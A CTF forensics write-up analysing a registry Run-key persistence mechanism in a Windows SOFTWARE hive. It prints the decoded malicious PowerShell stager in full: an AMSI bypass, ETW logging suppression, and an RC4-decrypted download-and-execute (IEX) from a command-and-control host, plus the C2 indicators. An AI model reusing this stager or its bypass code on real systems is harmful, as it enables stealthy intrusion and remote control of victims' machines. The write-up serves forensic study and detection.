# Wade's Trap — CTF Writeup

**Challenge:** Wade's Trap  
**Category:** Forensics / Windows Registry  
**CTF:** ADF 2026 Hackathon  
**Date:** July 2026

---

## Summary

Sixters compromised Wade's computer and installed a persistence mechanism — but Wade's team ran it as a honeypot. Given only the `SOFTWARE` registry hive, we needed to identify the attacker's persistence technique.

**Flag:** `HTB{101_p3rs1st3nc3_d3t3ct3d}`

---

## How We Solved It — Reasoning

### Initial Triage

Given only a single file — `SOFTWARE` (the system-wide Windows registry hive from `Windows\System32\config\SOFTWARE`) — we needed to find a persistence mechanism. The challenge explicitly told us "having the software registry hive" and asked to "find their persistence mechanism."

In Windows forensics, the `SOFTWARE` hive stores machine-level configuration including autorun entries, services, and scheduled tasks. The most common persistence vectors in this hive are:

1. **Run / RunOnce keys** — `Microsoft\Windows\CurrentVersion\Run`
2. **Winlogon hooks** — `Microsoft\Windows NT\CurrentVersion\Winlogon` (Shell, Userinit)
3. **Services** — entries under the Services key
4. **Scheduled Tasks** — `Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`
5. **AppInit_DLLs** — DLL injection at process creation
6. **WOW6432Node** mirrors for 32-bit on 64-bit

### Finding the Persistence Mechanism

Using `reglookup` to enumerate the `Run` key:

```bash
reglookup -p "Microsoft/Windows/CurrentVersion/Run" SOFTWARE
```

**Output:**

| Value Name | Type | Data |
|------------|------|------|
| SecurityHealth | EXPAND_SZ | `%windir%\system32\SecurityHealthSystray.exe` |
| VBoxTray | EXPAND_SZ | `%SystemRoot%\system32\VBoxTray.exe` |
| **IOI_updater** | **SZ** | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$sGMomKEmx=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Temp).Temp);powershell -Win Hidden -enc $sGMomKEmx"` |

The `IOI_updater` entry was immediately suspicious:

- **Masquerading name**: "IOI_updater" mimics a legitimate Intel I/O driver updater
- **PowerShell execution**: Launches PowerShell at every boot (Run key = runs at user logon)
- **Two-stage**: Reads a base64-encoded payload from registry and executes it

The command decodes to:

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$sGMomKEmx=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Temp).Temp);powershell -Win Hidden -enc $sGMomKEmx"
```

**Key insight**: The Run key loads a **stager** that reads a second value (`Temp`) from the registry and executes it as a base64-encoded PowerShell command (`-enc`). This is a classic two-stage registry persistence pattern — the Run key is just the loader, the actual payload is stored elsewhere in the registry.

### Recovering the Encoded Payload

The Run key references `HKCU:Software\Microsoft\Windows\CurrentVersion Temp` — but we only have the `SOFTWARE` hive (HKLM), not NTUSER.DAT (HKCU). However, searching the SOFTWARE hive for `Temp` under `Microsoft\Windows\CurrentVersion` revealed:

```bash
reglookup -p "Microsoft/Windows/CurrentVersion" SOFTWARE | grep -i Temp
```

**Found:** `/Microsoft/Windows/CurrentVersion/Temp` containing a massive base64 string — the encoded PowerShell payload stored in the SOFTWARE hive itself.

### Decoding the Payload

PowerShell's `-enc` flag expects base64-encoded **UTF-16LE**. Decoding:

```python
import base64
b64_payload = "SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALg..."
decoded = base64.b64decode(b64_payload).decode('utf-16-le')
```

**Decoded PowerShell payload:**

```powershell
If($PSVersionTable.PSVersion.Major -ge 3){
    $Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);
    $flag='HTB{101_p3rs1st3nc3_d3t3ct3d}';
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue(
        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        .GetField('etwProvider','NonPublic,Static').GetValue($null),0);
};
[System.Net.ServicePointManager]::Expect100Continue=0;
$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(
    'aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA')));
$t='/news.php';
$wc.Headers.Add('User-Agent',$u);
$K=[System.Text.Encoding]::ASCII.GetBytes('fN51R6=#vHUxEKXa0Ak@hyw%-z]|?VIZ');
$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};
$wc.Headers.Add("Cookie","BjJQgJrKbc=KSIAbCnbEAQXy2gVoZQWXJhBtUU=");
$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];$data=$data[4..$data.length];
-join[Char[]](& $R $data ($IV+$K))|IEX
```

---

## Attack Chain Analysis

### Stage 1: Registry Run Key (Loader)

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\IOI_updater
```

This value launches at every system boot with user logon. The Run key entry is minimal — it only reads and executes a value from the registry, making it harder to detect than a direct payload.

### Stage 2: Base64-Encoded Payload (Registry-Stored Backdoor)

Stored at `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Temp`, this PowerShell script:

1. **Disables AMSI** — bypasses Windows Defender script scanning
2. **Disables ETW Logging** — prevents PowerShell activity from being logged
3. **Contains the flag** as `$flag='HTB{101_p3rs1st3nc3_d3t3ct3d}'`
4. **Contacts C2** at `http://77.74.198.52:8083/news.php` with cookie auth
5. **Downloads RC4-encrypted payload** (key: `fN51R6=#vHUxEKXa0Ak@hyw%-z]|?VIZ`)
6. **Executes** via `IEX`

### C2 Infrastructure

| Component | Value |
|-----------|-------|
| C2 URL | `http://77.74.198.52:8083/news.php` |
| User-Agent | `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko` |
| Auth Cookie | `BjJQgJrKbc=KSIAbCnbEAQXy2gVoZQWXJhBtUU=` |
| RC4 Key | `fN51R6=#vHUxEKXa0Ak@hyw%-z]|?VIZ` |

---

## Artifacts

| Artifact | Registry Path | Purpose |
|----------|--------------|---------|
| Run Key | `HKLM\SOFTWARE\...\Run\IOI_updater` | Persistence loader |
| Payload | `HKLM\SOFTWARE\...\CurrentVersion\Temp` | Encoded backdoor |
| C2 Server | `77.74.198.52:8083` | Command & Control |
| User | `DESKTOP-UTDHED2\wade` | Compromised account |

---

## Flag

```
HTB{101_p3rs1st3nc3_d3t3ct3d}
```

The flag was a literal `$flag` variable in the decoded PowerShell payload, placed by the honeypot operators (Wade's team) to mark the captured persistence mechanism.

---

## Security Implications

| Finding | Severity | Impact |
|---------|----------|--------|
| Registry Run Key persistence | Critical | Survives reboots, executes at every user logon |
| AMSI bypass | Critical | Prevents Windows Defender from scanning malicious scripts |
| ETW bypass | Critical | Prevents PowerShell activity logging/auditing |
| C2 communication | Critical | Attacker maintains remote control via encrypted channel |
| Registry-stored payload | High | Malicious code hidden in registry, evades file-based AV |
| RC4 encryption | Medium | Second-stage payload is encrypted |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `reglookup` | Parse and enumerate Windows registry hive |
| `python3` + `base64` | Decode UTF-16LE base64 PowerShell payload |
| `strings` | Binary search through raw hive data |
